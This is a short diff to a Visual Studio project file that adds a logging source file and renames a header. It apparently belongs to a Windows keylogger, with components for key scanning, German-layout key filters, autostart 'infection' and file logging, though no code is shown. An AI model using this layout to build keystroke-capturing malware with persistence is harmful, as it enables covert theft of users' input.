@@ -112,6 +112,7 @@
     <ClCompile Include="keyscan\keyfilters_GERMAN-QWERTZ.cpp" />
     <ClCompile Include="keyscan\keyscan.cpp" />
     <ClCompile Include="log\logFILE\file.cpp" />
+    <ClCompile Include="log\log.cpp" />
     <ClCompile Include="pch.cpp">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
@@ -121,7 +122,7 @@
   <ItemGroup>
     <ClInclude Include="infect_system\make_autostart\autostart.h" />
     <ClInclude Include="keyscan\keyscan.h" />
-    <ClInclude Include="log\logdef.h" />
+    <ClInclude Include="log\log.h" />
     <ClInclude Include="log\logFILE\file.h" />
     <ClInclude Include="pch.h" />
     <ClInclude Include="settings.h" />
